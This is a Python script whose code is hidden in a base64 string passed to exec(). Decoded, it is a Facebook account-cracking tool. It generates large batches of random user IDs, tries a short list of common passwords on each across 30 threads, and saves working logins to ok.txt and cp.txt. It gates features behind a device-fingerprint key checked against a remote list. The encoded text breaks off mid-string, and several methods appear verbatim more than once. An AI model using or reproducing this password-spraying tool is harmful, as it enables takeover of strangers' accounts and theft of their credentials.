# Author : MOHAMMAD AHAD
# Gihub : AHAD-VAU-KING

import base64
exec(base64.b64decode("IyByZXZlcnNlIHB1dC5weSAKIyBmaWxlIG5hbWUgd293LmNweXRob24tMzEwLnNvCgpXID0gJ1wwMzNbOTc7MW0nIApSID0gJ1wwMzNbOTE7MW0nIApHID0gJ1wwMzNbOTI7MW0nIApZID0gJ1wwMzNbOTM7MW0nIApCID0gJ1wwMzNbOTQ7MW0nClAgPSAnXDAzM1s5NTsxbScKQyA9ICdcMDMzWzk2OzFtJwpOID0gJ1x4MWJbMG0nCgoKCmltcG9ydCBvcwp0cnk6CglpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCByZXF1ZXN0cyIpCgp0cnk6CglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgZnV0dXJlcyIpCgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IGJhc2U2NAppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCgoKZGVmIHJ1bnR4dCh6KToKICAgIGZvciBlIGluIHogKyAiXG4iOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDMpCgoKCmRlZiBoZWxwbm90ZSgpOgoJcHJpbnQoIiVzIFsqXSBGT0xMT1cgTUUgT04gRmIgVFUgS05PVyBBQk9VVCBVUERBVEVTICA6KSIlKEcpKQoJc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyJhbSIsICJzdGFydCIsICJodHRwczovL2dpdGh1Yi5jb20vQUhBRC1WQVUtS0lORy9hcHByb3ZlZC9ibG9iL21haW4vYXBwcm92ZWQudHh0Il0pCglleGl0KCIgWypdIEZBQ0VCT09LIDogIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9LYXJvLlZhYi5DaHVkYXIuVGltZS5OYWlpIikKCgpkZWYgbm90aWNlKCk6CgogCgoJcnVudHh0KCJcblwwMzNbMDs5MW1ZT1UgQVJFIE5PVCBQUkVNSVVNIFVTRVIgIikKCXJ1bnR4dCgiXDAzM1swOzkzbSAgU0VOVCBUSElTIEtFWSBUTyBBRE1JTiA+PiAlcyVzIiUoRyxiYXNlc3BsaXQpKQoJcnVudHh0KCJcMDMzWzA7OTJtIEFETUlOIE1FU1NFTkdFUvCflLBBSEFELVZBVSIpCglzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbImFtIiwgInN0YXJ0IiwgImh0dHBzOi8vbS5tZS9LYXJvLlZhYi5DaHVkYXIuVGltZS5OYWlpIl0pCgoKICAgICAgICAKCQoJCnBsaXN0ID0gKHBsYXRmb3JtLnVuYW1lKCkpWzJdCmJhc2V4ID0gcGxpc3QKYmFzZXgxID0gYmFzZXguZW5jb2RlKCdhc2NpaScpCmJhc2V4MiA9IGJhc2U2NC5iNjRlbmNvZGUoYmFzZXgxKQpiYXNleDMgPSBiYXNleDIuZGVjb2RlKCdhc2NpaScpCmJhc2U0ID0gKGJhc2V4MykudXBwZXIoKQpiYXNlc3BsaXQgPSBiYXNlNC5yZXBsYWNlKCc9JywgJ1gnKS5yZXBsYWNlKCdBJywgJzMnKS5yZXBsYWNlKCdCJywgJzknKS5yZXBsYWNlKCdDJywgJzcnKS5yZXBsYWNlKCdEJywgJzEnKS5yZXBsYWNlKCdFJywgJzQnKS5yZXBsYWNlKCdNJywgJzInKS5yZXBsYWNlKCdMJywgJzYnKS5yZXBsYWNlKCdGJywgJzgnKS5yZXBsYWNlKCdOJywgJ0UnKS5yZXBsYWNlKCdUJywgJzgnKQoKCmNsYXNzIE1haW46CglkZWYgX19pbml0X18oc2VsZik6CgkJc2VsZi5pZCA9IFtdCgkJc2VsZi5vayA9IFtdCgkJc2VsZi5jcCA9IFtdCgkJc2VsZi5sb29wID0gMAoJCXRyeToKCQkJcGxyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dpdGh1Yi5jb20vQUhBRC1WQVUtS0lORy9hcHByb3ZlZC9ibG9iL21haW4vYXBwcm92ZWQudHh0JykudGV4dAoJCQlpZiBiYXNlc3BsaXQgaW4gcGxyOgoJCQkJa2V5ID0gYmFzZXNwbGl0CgkJCQlzdGF0ID0gKCJcMDMzWzA7OTJtUFJFTUlVTSIpCgkJCQlGWSA9ICdcMDMzWzA7OTNtJwoJCQkJRkcgPSAnXDAzM1swOzkybScKCQkJCUdFVCA9ICdccicKCQkJZWxzZToKCQkJCWtleSA9ICgiXDAzM1swOzkxbSAtIikKCQkJCXN0YXQgPSAoIlwwMzNbMDs5MW1GUkVFIFVTRVIiKQoJCQkJRlkgPSAnXDAzM1swOzkwbScKCQkJCUZHID0gJ1wwMzNbMDs5MG0nCgkJCQlHRVQgPSAnXDAzM1swOzkybSBbUF0gR0VUIFBSRU1JVU0nCgkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQlwcmludCgiXG4lcyBbIV0gTk8gSU5URVJORVQgQ09OTkVDVElPTi4uXG4iJShHKSkKCQkJZXhpdCgpCgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJCgkJcHJpbnQgKCIiIlwwMzNbMTs5Mm0gX19fX19fXyAgICBfX19fXyBfX19fICBfX19fICAgIF8gICAgICBfX19fX18gICAgCiAgICAgCgoKCiAgICMjIyAgICAjIyAgICAgIyMgICAgIyMjICAgICMjIyMjIyMjICAKICAjIyAjIyAgICMjICAgICAjIyAgICMjICMjICAgIyMgICAgICMjIAogIyMgICAjIyAgIyMgICAgICMjICAjIyAgICMjICAjIyAgICAgIyMgCiMjICAgICAjIyAjIyMjIyMjIyMgIyMgICAgICMjICMjICAgICAjIyAKIyMjIyMjIyMjICMjICAgICAjIyAjIyMjIyMjIyMgIyMgICAgICMjIAojIyAgICAgIyMgIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgCiMjICAgICAjIyAjIyAgICAgIyMgIyMgICAgICMjICMjIyMjIyMjICAKCgogCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERFVkVMT1BFRCBCWSBBSEFELVZBVSAgICAgICAgICAgICAgICAgICAgICAgICAgCgpcMDMzWzE7OTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQClwwMzNbMTs5MW0gW1wwMzNbMTs5NG3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRkFDRUJPT0sgOiBNb2hhbW1hZCBBaGFkICAKXDAzM1sxOzkxbSBbXDAzM1sxOzk0beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1GQiBQQUdFIDogIE1vaGFtbWFkIEFoYWQKXDAzM1sxOzkxbSBbXDAzM1sxOzk0beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1HSVRIVUIgICA6IEFIQUQtVkFVLUtJTkcKXDAzM1sxOzkxbSBbXDAzM1sxOzk0beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1XQVJOSU5HICA6IEZ1Y2sgTXkgQWxsIEhhdGVycwpcMDMzWzE7OTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCiAgICAiIiIpCgkJcHJpbnQoIiVzIFslc+KAoiVzXSAlc1RPT0wgTkFNRSA6ICVzU3VwZXIgU3BlZWQgVWlkIENsb25pbmciJShHLFIsRyxCLEcpKQoJCXByaW50KCIlcyBbJXPigKIlc10gJXNWRVJTSU9OICAgOiAlczIuMiIlKEcsUixHLEIsRykpCgkJcHJpbnQoIiVzIFslc+KAoiVzXSAlc1lPVVIgS0VZICA6ICVzJXMiJShHLFIsRyxCLEcsa2V5KSkKCQlwcmludCgiJXMgWyVz4oCiJXNdICVzU1RBVFVTICAgIDogJXMiJShHLFIsRyxCLHN0YXQpKSAKCQlwcmludCgiIikKCQlwcmludCgiJXMgWyVzMDElc10lcyBDUkFDSyBSQU5ET00gRkIgSUQgMjAwOS0xMSAlcyhQUk8pIFYxW0hpZ2ggU3BlZWRdIiUoUixHLFIsWSxHKSkKCQlwcmludCgiJXMgWyVzMDIlc10lcyBDUkFDSyBSQU5ET00gRkIgSUQgMjAwNS04ICVzIChQUk8pIFYyW0hpZ2ggU3BlZWRdIiUoUixHLFIsWSxHKSkKCQlwcmludCgiJXMgWyVzMDMlc10lcyBDUkFDSyBSQU5ET00gRkIgSUQgMjAwNC01ICVzIChQUk8pIFYzW1N1cGVyIFNsb3ddIiUoUixHLFIsWSxHKSkKCQlwcmludCgiJXMgWyVzMDQlc10lcyBDUkFDSyBGUk9NIEVNQUlMUyAlcyhQUk8pIFtOb3JtYWxdIiUoUixHLFIsWSxHKSkKCQlwcmludChHRVQpCgkJaG9nYSA9IGlucHV0KCJcbiVzIFs/XSBDSE9JQ0UgOiAiJShCKSkKCQlpZiBob2dhIGluIFsiIiwgIiAiXToKCQkJTWFpbigpCgkJZWxpZiBob2dhIGluIFsiIiwgIjAiXToKCQkJaWYgYmFzZXNwbGl0IGluIHBscjoKCQkJCXNlbGYub2xkY3JhY2soKQoJCQllbHNlOiAKCQkJCW5vdGljZSgpCgkJCQlleGl0KCkKCQllbGlmIGhvZ2EgaW4gWyIxIiwgIjAxIl06CgkJCWlmIGJhc2VzcGxpdCBpbiBwbHI6CgkJCSAgICBzZWxmLmZidHVhKCkKCQkJZWxzZTogCgkJCQlub3RpY2UoKQoJCQkJZXhpdCgpCgkJZWxpZiBob2dhIGluIFsiMiIsICIwMiJdOgoJCQlpZiBiYXNlc3BsaXQgaW4gcGxyOgoJCQkgICAgc2VsZi5mYnR1YSgpCgkJCWVsc2U6IAoJCQkJbm90aWNlKCkKCQkJCWV4aXQoKQoJCWVsaWYgaG9nYSBpbiBbIjMiLCAiMDMiXToKCQkJaWYgYmFzZXNwbGl0IGluIHBscjoKCQkJCXNlbGYub2xkNF81KCkKCQkJZWxzZTogCgkJCQlub3RpY2UoKQoJCQkJZXhpdCgpCgkJZWxpZiBob2dhIGluIFsiNCIsICIwNCJdOgoJCQlpZiBiYXNlc3BsaXQgaW4gcGxyOgoJCQkJc2VsZi5lbWFpbCgpCgkJCWVsc2U6IAoJCQkJbm90aWNlKCkKCQkJCWV4aXQoKQoJCWVsaWYgaG9nYSBpbiBbIlAiLCAicCJdOgoJCQlub3RpY2UoKQoJCQlleGl0KCkKCQllbHNlOgoJCQlNYWluKCkKCglkZWYgb2xkY3JhY2soc2VsZik6CgkJeCA9IDExMTExMTExCgkJeHggPSA5OTk5OTk5OQoJCWlkeCA9ICIgMTAwMDAwMCIKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkKCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkKCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6CgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkKCQkJCXByaW50KCIlcyBbKl0gQ1JBQ0sgV0lUSCBQQVNTV09SRCAtPiBbXDAzM1swOzkxbSVzXDAzM1swOzkzbV0iJShZLGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCglkZWYgb2xkY3JhY2soc2VsZik6CgkJeCA9IDExMTExMTExCgkJeHggPSA5OTk5OTk5OQoJCWlkeCA9ICIgMTAwMDAwMCIKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkKCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkKCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6CgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkKCQkJCXByaW50KCIlcyBbKl0gQ1JBQ0sgV0lUSCBQQVNTV09SRCAtPiBbXDAzM1swOzkxbSVzXDAzM1swOzkzbV0iJShZLGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCglkZWYgZmJ0dWEoc2VsZik6CgkJeCA9IDExMTExMTExMQoJCXh4ID0gOTk5OTk5OTk5CgkJaWR4ID0gIjEwMDAwMCIKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkKCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkKCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6CgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkKCQkJCXByaW50KCIlcyBbKl0gQ1JBQ0sgV0lUSCBQQVNTV09SRCAtPiBbXDAzM1swOzkxbSVzXDAzM1swOzkzbV0iJShZLGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCglkZWYgb2xkY3JhY2soc2VsZik6CgkJeCA9IDExMTExMTExCgkJeHggPSA5OTk5OTk5OQoJCWlkeCA9ICIgMTAwMDAwMCIKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkKCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkKCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6CgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkKCQkJCXByaW50KCIlcyBbKl0gQ1JBQ0sgV0lUSCBQQVNTV09SRCAtPiBbXDAzM1swOzkxbSVzXDAzM1swOzkzbV0iJShZLGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCglkZWYgb2xkY3JhY2soc2VsZik6CgkJeCA9IDExMTExMTExCgkJeHggPSA5OTk5OTk5OQoJCWlkeCA9ICIgMTAwMDAwMCIKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkKCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkKCQkJCWlmIGxlbihsaXN0cGFzcyk8PTU6CgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkKCQkJCXByaW50KCIlcyBbKl0gQ1JBQ0sgV0lUSCBQQVNTV09SRCAtPiBbXDAzM1swOzkxbSVzXDAzM1swOzkzbV0iJShZLGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiVzIFsrXSBPSyBSRVNVTFRTIFNBVkVEIElOIC0+IG9rLnR4dCIlKEcpKQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCgoJZGVmIG9sZDRfNihzZWxmKToKCQl4ID0gMTExMTExMQoJCXh4ID0gOTk5OTk5OQoJCSNpZHggPSBpbnB1dCgiJXMgWytdIEVOVEVSIEEgRElHSVQgKDEtOSk6ICVzIiUoWSxHKSkKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSgxMDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT4xMDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkgCgkJCQlsaXN0cGFzcyA9IGlucHV0KCIlcyBbP10gRU5URVIgUEFTU1dPUkQgOiVzICIlKFksRykpCgkJCQlpZiBsZW4obGlzdHBhc3MpPD01OgoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpCgkJCQlwcmludCgiJXMgWypdIENSQUNLIFdJVEggUEFTU1dPUkQgLT4gW1wwMzNbMDs5MW0lc1wwMzNbMDs5M21dIiUoWSxsaXN0cGFzcykpCgkJCQlwcmludCgiXG4lcyBbK10gT0sgUkVTVUxUUyBTQVZFRCBJTiAtPiBvay50eHQiJShHKSkKCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUUyBTQVZFRCBJTiAtPiBj